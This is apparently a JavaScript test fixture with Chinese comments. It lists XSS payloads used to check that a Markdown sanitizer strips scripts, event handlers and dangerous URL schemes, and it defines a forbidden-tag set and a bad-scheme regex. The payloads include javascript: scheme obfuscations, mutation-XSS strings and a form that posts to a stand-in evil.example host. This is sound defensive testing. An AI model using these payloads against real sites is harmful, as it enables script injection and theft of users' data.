/**
 * XSS 对抗载荷清单（红队用）。
 *
 * 每条载荷都会被 `lib/markdown.ts` 的 renderMarkdown() 洗一遍，然后**真的塞进
 * 浏览器 DOM**（`innerHTML`，和 `v-html` 同一条路径），再断言：
 *   1. 没有任何脚本真的执行（载荷里的回调 `__xssHit()` / alert / 图片请求都被记账）；
 *   2. 洗出来的 DOM 里没有危险标签、没有 on* 属性、没有危险协议的 URL。
 *
 * 写新载荷的约定：想验证「执行了」就调 `window.__xssHit('<id>')`，
 * id 用载荷的 name，断言失败时报告里能直接看出是哪一条破防。
 *
 * 分类：
 *   raw    —— Markdown 里夹生 HTML
 *   md     —— Markdown 自己的语法（链接 / 图片 / 自动链接）
 *   scheme —— URL 协议绕过（大小写、实体、空白、控制字符）
 *   mxss   —— 变异 XSS（解析上下文切换，DOMPurify 历史上的重灾区）
 *   policy —— 不是执行向量，但违反本站白名单策略（data: 图、svg、style、form…）
 */

/** @type {{name: string, kind: string, md: string, note?: string}[]} */
export const PAYLOADS = [
  // ---------- raw：Markdown 里夹生 HTML ----------
  { name: 'img-onerror', kind: 'raw', md: `<img src=x onerror="window.__xssHit('img-onerror')">` },
  { name: 'img-onerror-unquoted', kind: 'raw', md: `<img src=x onerror=window.__xssHit('img-onerror-unquoted')>` },
  { name: 'script-inline', kind: 'raw', md: `<script>window.__xssHit('script-inline')</script>` },
  { name: 'script-nested', kind: 'raw', md: `<scr<script>ipt>window.__xssHit('script-nested')</scr</script>ipt>` },
  { name: 'svg-script', kind: 'raw', md: `<svg><script>window.__xssHit('svg-script')</script></svg>` },
  { name: 'svg-onload', kind: 'raw', md: `<svg onload="window.__xssHit('svg-onload')"></svg>` },
  { name: 'svg-animate', kind: 'raw', md: `<svg><a><animate attributeName="href" values="javascript:window.__xssHit('svg-animate')"/><text x="10" y="10">x</text></a></svg>` },
  { name: 'iframe-srcdoc', kind: 'raw', md: `<iframe srcdoc="&lt;script&gt;parent.__xssHit('iframe-srcdoc')&lt;/script&gt;"></iframe>` },
  { name: 'iframe-src-js', kind: 'raw', md: `<iframe src="javascript:parent.__xssHit('iframe-src-js')"></iframe>` },
  { name: 'object-data', kind: 'raw', md: `<object data="javascript:window.__xssHit('object-data')"></object>` },
  { name: 'embed-src', kind: 'raw', md: `<embed src="javascript:window.__xssHit('embed-src')">` },
  { name: 'body-onload', kind: 'raw', md: `<body onload="window.__xssHit('body-onload')">` },
  { name: 'details-ontoggle', kind: 'raw', md: `<details open ontoggle="window.__xssHit('details-ontoggle')"><summary>x</summary></details>` },
  { name: 'marquee-onstart', kind: 'raw', md: `<marquee onstart="window.__xssHit('marquee-onstart')">x</marquee>` },
  { name: 'custom-tag-onfocus', kind: 'raw', md: `<xss id="x" tabindex="1" onfocus="window.__xssHit('custom-tag-onfocus')" autofocus>x</xss>` },
  { name: 'p-onclick', kind: 'raw', md: `<p onclick="window.__xssHit('p-onclick')">点我</p>` },
  { name: 'video-onerror', kind: 'raw', md: `<video><source onerror="window.__xssHit('video-onerror')"></video>` },
  { name: 'template-script', kind: 'raw', md: `<template><script>window.__xssHit('template-script')</script></template>` },
  { name: 'meta-refresh', kind: 'raw', md: `<meta http-equiv="refresh" content="0;url=javascript:window.__xssHit('meta-refresh')">` },
  { name: 'base-hijack', kind: 'raw', md: `<base href="https://evil.example/">` , note: '劫持后续相对 URL' },
  { name: 'link-stylesheet', kind: 'raw', md: `<link rel="stylesheet" href="https://evil.example/x.css">` },
  { name: 'style-import', kind: 'raw', md: `<style>@import url("https://evil.example/x.css");</style>` },
  { name: 'form-action', kind: 'raw', md: `<form action="https://evil.example/steal"><input name="csrf"><button>x</button></form>` },
  { name: 'button-formaction', kind: 'raw', md: `<form><button formaction="javascript:window.__xssHit('button-formaction')">x</button></form>` },
  { name: 'comment-conditional', kind: 'raw', md: `<!--[if gte IE 4]><script>window.__xssHit('comment-conditional')</script><![endif]-->` },
  { name: 'style-attr-expr', kind: 'raw', md: `<div style="background-image:url('javascript:window.__xssHit(&quot;style-attr-expr&quot;)')">x</div>` },
  { name: 'srcset-bypass', kind: 'raw', md: `<img src="x" srcset="data:image/svg+xml;base64,PHN2Zy8+ 1x">` },
  { name: 'data-attr', kind: 'raw', md: `<div data-owner-email="victim@example.com">x</div>`, note: 'data-* 不应保留（可能夹带隐私）' },
  { name: 'id-class-dom-clobber', kind: 'raw', md: `<a id="attributes" href="/x">x</a><form id="body"></form>`, note: 'DOM clobbering' },

  // ---------- scheme：协议绕过 ----------
  { name: 'a-js-plain', kind: 'scheme', md: `<a href="javascript:window.__xssHit('a-js-plain')">x</a>` },
  { name: 'a-js-entity', kind: 'scheme', md: `<a href="javas&#99;ript:window.__xssHit('a-js-entity')">x</a>` },
  { name: 'a-js-entity-hex', kind: 'scheme', md: `<a href="&#x6a;avascript:window.__xssHit('a-js-entity-hex')">x</a>` },
  { name: 'a-js-mixedcase', kind: 'scheme', md: `<a href="jAvAsCrIpT:window.__xssHit('a-js-mixedcase')">x</a>` },
  { name: 'a-js-leading-space', kind: 'scheme', md: `<a href="   javascript:window.__xssHit('a-js-leading-space')">x</a>` },
  { name: 'a-js-tab', kind: 'scheme', md: `<a href="java&#9;script:window.__xssHit('a-js-tab')">x</a>` },
  { name: 'a-js-newline', kind: 'scheme', md: `<a href="java&#10;script:window.__xssHit('a-js-newline')">x</a>` },
  { name: 'a-js-nul', kind: 'scheme', md: `<a href="java&#0;script:window.__xssHit('a-js-nul')">x</a>` },
  { name: 'a-vbscript', kind: 'scheme', md: `<a href="vbscript:msgbox(1)">x</a>` },
  { name: 'a-data-html', kind: 'scheme', md: `<a href="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX194c3NIaXQoJ2EtZGF0YS1odG1sJyk8L3NjcmlwdD4=">x</a>` },
  { name: 'a-blob', kind: 'scheme', md: `<a href="blob:https://evil.example/2b8c">x</a>` },
  { name: 'a-file', kind: 'scheme', md: `<a href="file:///etc/passwd">x</a>` },
  { name: 'img-data-svg', kind: 'policy', md: `<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiLz4=">`, note: 'data: 图必须被拦（SVG 可带脚本）' },

  // ---------- md：Markdown 自己的语法 ----------
  { name: 'md-link-js', kind: 'md', md: `[点我](javascript:window.__xssHit('md-link-js'))` },
  { name: 'md-link-js-entity', kind: 'md', md: `[点我](java&#115;cript:window.__xssHit('md-link-js-entity'))` },
  { name: 'md-link-js-space', kind: 'md', md: `[点我](<javascript:window.__xssHit('md-link-js-space')>)` },
  { name: 'md-ref-link-js', kind: 'md', md: `[点我][ref]\n\n[ref]: javascript:window.__xssHit('md-ref-link-js')` },
  { name: 'md-autolink-js', kind: 'md', md: `<javascript:window.__xssHit('md-autolink-js')>` },
  { name: 'md-img-js', kind: 'md', md: `![x](javascript:window.__xssHit('md-img-js'))` },
  { name: 'md-img-attr-break', kind: 'md', md: `![x](x" onerror="window.__xssHit('md-img-attr-break'))` },
  { name: 'md-img-title-break', kind: 'md', md: `![x](/ok.png "a\\" onerror=\\"window.__xssHit('md-img-title-break')")` },
  { name: 'md-code-html', kind: 'md', md: '```html\n<img src=x onerror="window.__xssHit(\'md-code-html\')">\n```' },
  { name: 'md-inline-code-html', kind: 'md', md: '`<img src=x onerror="window.__xssHit(\'md-inline-code-html\')">`' },
  { name: 'md-autolink-http', kind: 'md', md: `<https://example.com/ok>`, note: '正常外链，应存活并带 noopener' },
  { name: 'md-gfm-autolink', kind: 'md', md: `访问 https://example.com/ok 看看`, note: '正常外链' },
  { name: 'md-relative-link', kind: 'md', md: `[站内](/guide/intro)`, note: '站内相对链接应存活' },
  { name: 'md-mailto', kind: 'md', md: `[写信](mailto:hi@example.com)`, note: 'mailto 应存活' },
  { name: 'md-protocol-relative', kind: 'md', md: `[外站](//evil.example/x)`, note: '协议相对链接：留着也必须带 noopener' },

  // ---------- mXSS：解析上下文切换 ----------
  { name: 'mxss-noscript', kind: 'mxss', md: `<noscript><p title="</noscript><img src=x onerror=window.__xssHit('mxss-noscript')>"></noscript>` },
  { name: 'mxss-math-mglyph', kind: 'mxss', md: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=window.__xssHit('mxss-math-mglyph')&gt;">` },
  { name: 'mxss-svg-style', kind: 'mxss', md: `<svg></p><style><a id="</style><img src=1 onerror=window.__xssHit('mxss-svg-style')>">` },
  { name: 'mxss-form-clobber', kind: 'mxss', md: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__xssHit('mxss-form-clobber')>` },
  { name: 'mxss-table-caption', kind: 'mxss', md: `<table><caption><svg><foreignobject><table><desc><style></style><img src=1 onerror=window.__xssHit('mxss-table-caption')>` },
  { name: 'mxss-select-noembed', kind: 'mxss', md: `<select><noembed></select><img src=x onerror=window.__xssHit('mxss-select-noembed')>` },
  { name: 'mxss-textarea', kind: 'mxss', md: `<textarea><p title="</textarea><img src=x onerror=window.__xssHit('mxss-textarea')>">` },
  { name: 'mxss-xmp', kind: 'mxss', md: `<xmp><p title="</xmp><img src=x onerror=window.__xssHit('mxss-xmp')>">` },
  { name: 'mxss-annotation-xml', kind: 'mxss', md: `<math><annotation-xml encoding="text/html"><img src=x onerror=window.__xssHit('mxss-annotation-xml')></annotation-xml></math>` },
  { name: 'mxss-style-comment', kind: 'mxss', md: `<style><!--</style><img src=x onerror=window.__xssHit('mxss-style-comment')>` },
]

/** 洗完之后绝不允许在 DOM 里出现的标签。 */
export const FORBIDDEN_TAGS = new Set([
  'script', 'iframe', 'object', 'embed', 'style', 'link', 'meta', 'base',
  'form', 'input', 'button', 'select', 'option', 'textarea', 'noscript',
  'svg', 'math', 'foreignobject', 'annotation-xml', 'mglyph', 'mtext',
  'template', 'frame', 'frameset', 'applet', 'marquee', 'xmp', 'noembed',
  'video', 'audio', 'source', 'track', 'portal',
])

/** URL 型属性：值里出现这些协议就算破防。 */
export const URL_ATTRS = ['href', 'src', 'srcset', 'action', 'formaction', 'data', 'poster', 'background', 'xlink:href', 'ping']
export const BAD_SCHEMES = /^(javascript|data|vbscript|livescript|mocha|blob|file|about|filesystem):/i
